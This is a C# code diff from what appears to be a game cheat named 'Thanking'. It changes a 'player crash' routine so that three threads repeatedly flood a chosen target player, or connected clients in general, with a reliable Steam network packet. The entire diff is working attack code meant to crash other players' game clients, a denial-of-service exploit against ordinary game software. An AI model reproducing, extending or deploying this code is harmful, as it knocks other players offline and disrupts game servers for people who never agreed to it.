@@ -13,6 +13,8 @@ namespace Thanking.Threads
         public static bool PlayerCrashEnabled;
         public static bool ContinuousPlayerCrash;
         public static CSteamID CrashTarget;
+        public static byte[] Packet;
+        public static int Size;
         
         [Thread]
         public static void Start()
@@ -24,14 +26,21 @@ namespace Thanking.Threads
             SteamChannel channel = VehicleManager.instance.channel;
             
             int call = channel.getCall("askStructures");
-            channel.getPacket(ESteamPacket.UPDATE_RELIABLE_INSTANT, call, out var size, out var packet);
+            channel.getPacket(ESteamPacket.UPDATE_RELIABLE_INSTANT, call, out Size, out Packet);
             
             Provider.onClientDisconnected += OnDisconnect;
     
+            for (int i = 0; i < 3; i++)
+                new Thread(CrashThread).Start();
+        }
+
+        public static void CrashThread()
+        {
             while (true)
             {
                 if (PlayerCrashEnabled)
-                    Provider.send(CrashTarget, ESteamPacket.UPDATE_RELIABLE_INSTANT, packet, size, 0);
+                    Provider.send(CrashTarget, ESteamPacket.UPDATE_RELIABLE_INSTANT, Packet, Size, 0);
+                
                 else
                 {
                     if (!ContinuousPlayerCrash || Provider.clients.Count == 0)
@@ -43,7 +52,7 @@ namespace Thanking.Threads
                 }
             }
         }
-
+        
         public static void OnDisconnect() =>
             PlayerCrashEnabled = false;
     }
